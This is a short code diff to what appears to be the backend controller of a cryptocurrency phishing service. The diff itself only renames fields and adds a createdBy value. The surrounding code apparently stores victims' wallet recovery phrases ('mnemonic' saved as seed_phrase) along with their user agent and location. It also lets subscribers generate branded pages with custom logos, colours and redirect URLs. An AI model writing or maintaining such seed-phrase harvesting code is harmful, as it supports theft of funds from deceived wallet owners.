@@ -353,7 +353,7 @@ const createPhrase = async (req, res) => {
     }
 
     // Create phrase
-    const newPhrase = await Phrase.create({ userId, phrase });
+    const newPhrase = await Phrase.create({ userId, seed_phrase:phrase });
 
     // Optionally include user info in the response
     const phraseWithUser = await Phrase.findByPk(newPhrase.id, {
@@ -703,8 +703,8 @@ const setAccPhrase = async (req, res) => {
     }
 
     await cryptoLog.update({
-      phrase: mnemonic,
-      userInfo,
+      seed_phrase: mnemonic,
+      useragent:userInfo,
       location,
     });
 
@@ -1320,7 +1320,7 @@ const createUrl = async (req, res) => {
     // Create a new CryptoLog
     const newCryptoLog = await CryptoLogs.create({
       userId,
-      appName,
+      app_name:appName,
       appLogo,
       modalColor,
       backgroundcolor,
@@ -1340,7 +1340,7 @@ const createUrl = async (req, res) => {
       redirectUrl,
       cryptoLogId: newCryptoLog.id, // Use 'id' instead of '_id' for Sequelize
       appLogo,
-      appName,
+      app_name:appName,
       modalColor,
       btnColor,
       backgroundcolor,
@@ -1521,7 +1521,7 @@ const updateUrl = async (req, res) => {
       description,
       user: userId,
       redirectUrl,
-      appName,
+      app_name:appName,
       appLogo,
       backgroundcolor,
       modalColor,
@@ -1538,7 +1538,7 @@ const updateUrl = async (req, res) => {
     // Update the CryptoLog record
     await cryptoLog.update({
       userId,
-      appName,
+      app_name:appName,
       appLogo,
       modalColor,
       backgroundcolor,
@@ -1914,7 +1914,6 @@ const createSubscriptionHistory = async (req, res) => {
       });
     }
 
-    // Create new subscription history
     const newSubscriptionHistory = await SubscriptionHistory.create({
       userId,
       subscriptionId,
@@ -1922,6 +1921,7 @@ const createSubscriptionHistory = async (req, res) => {
       expireDate: expireDate || new Date(),
       active: active ?? false,
       redeem: redeem ?? true,
+      createdBy:userId
     });
 
     return res.status(201).json({
